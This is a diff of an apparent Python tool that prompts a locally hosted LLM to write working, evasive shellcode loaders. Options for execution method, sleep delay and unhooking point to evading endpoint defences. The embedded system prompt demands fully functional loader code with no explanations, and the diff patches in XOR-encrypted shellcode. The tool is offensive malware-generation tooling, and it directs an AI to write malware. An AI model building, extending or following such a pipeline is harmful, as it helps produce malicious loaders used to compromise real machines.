@@ -9,13 +9,7 @@ from pathlib import Path
 def setup_logging():
     logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def load_configuration(config_file='config.json'):
-    if os.path.exists(config_file):
-        with open(config_file, 'r') as file:
-            return json.load(file)
-    return {}
-
-def get_parameters(config):
+def get_parameters():
     parser = argparse.ArgumentParser(description="Generate code based on specified parameters.")
     
     # Required parameters
@@ -27,9 +21,11 @@ def get_parameters(config):
                                "etwpcreateetwthread", "fiber", "pointer"],
                        help="Shellcode execution method")
     
-    # Optional parameters with None as default
-    parser.add_argument("--language", type=str, default=config.get("language", "C"),
+    # Optional parameters with defaults
+    parser.add_argument("--language", type=str, default="C",
                        help="Programming language")
+    
+    # Optional parameters with None as default
     parser.add_argument("--sleep_time", type=int,
                        help="Initial sleep delay in milliseconds")
     parser.add_argument("--unhooking_method", type=str,
@@ -120,7 +116,7 @@ def generate_code(client, params, max_tokens=15000):
     
     system_prompt = [
         "You are an AI specialized in creating complete, functional shellcode loaders. ",
-        "You must provide fully implemented code with NO placeholder functions or comments. ",
+        "You must provide fully implemented code with NO placeholder functions or comments. No function should be empty or awaiting logic implementation. ",
         "Every function must contain complete, working implementation logic. ",
         "IMPORTANT: Output ONLY the code block with NO explanations, descriptions, or comments.",
         "ANY text outside the code block will be ignored.",
@@ -171,8 +167,7 @@ def generate_code(client, params, max_tokens=15000):
     user_prompt = [
         f"Generate a complete, production-ready {params.get('language', 'C')} shellcode loader that:\n",
         "1. Includes all necessary headers and imports\n",
-        "2. Uses the variable name 'unsigned char shellcode[]' for the shellcode array.\n",
-        "   Place '// [SHELLCODE_ARRAY]' where this array should be defined\n",
+        "2. Place 'unsigned char shellcode[] = { /* shellcode bytes will be inserted here */ };' where the array should be defined\n",
         "3. All code must reference 'shellcode' as the shellcode array variable name\n"
     ]
     
@@ -215,12 +210,12 @@ def generate_code(client, params, max_tokens=15000):
     # Add validation check for placeholder content
     def validate_code(code):
         placeholder_patterns = [
-            r'//\s*Placeholder\s*$',  # Only match exact "Placeholder" comments
-            r'//\s*TODO\s*$',         # Only match exact "TODO" comments
-            r'//.*\bimplementation needed\b',  # More specific implementation comment check
-            r'void\s+\w+\(\)\s*{\s*}\s*$',    # Empty functions
-            r'//.*\bplaceholder\b.*$',         # More specific placeholder comment check
-            r'//\s*\[SHELLCODE_ARRAY\]'        # Check if shellcode array placeholder remains
+            r'//\s*Placeholder\s*$',
+            r'//\s*TODO\s*$',
+            r'//.*\bimplementation needed\b',
+            r'void\s+\w+\(\)\s*{\s*}\s*$',
+            r'//.*\bplaceholder\b.*$',
+            r'unsigned\s+char\s+shellcode\s*\[\s*\]\s*=\s*\{\s*\}\s*;'  # Check for empty shellcode array
         ]
         
         for pattern in placeholder_patterns:
@@ -260,9 +255,9 @@ def generate_code(client, params, max_tokens=15000):
                 params['shellcode_file'], 
                 params['xor_key']
             )
-            # Insert the encrypted shellcode where the placeholder is
+            # Update the replacement pattern to match the new format
             code_content = code_content.replace(
-                "// [SHELLCODE_ARRAY]",
+                "unsigned char shellcode[] = { /* shellcode bytes will be inserted here */ };",
                 encrypted_shellcode
             )
         
@@ -284,8 +279,7 @@ def generate_code(client, params, max_tokens=15000):
 
 if __name__ == "__main__":
     setup_logging()
-    config = load_configuration()
-    params = get_parameters(config)
+    params = get_parameters()
     logging.info("Parameters retrieved: %s", params)
 
     client = OpenAI(base_url="http://192.168.0.210:443/v1", api_key="lm-studio")
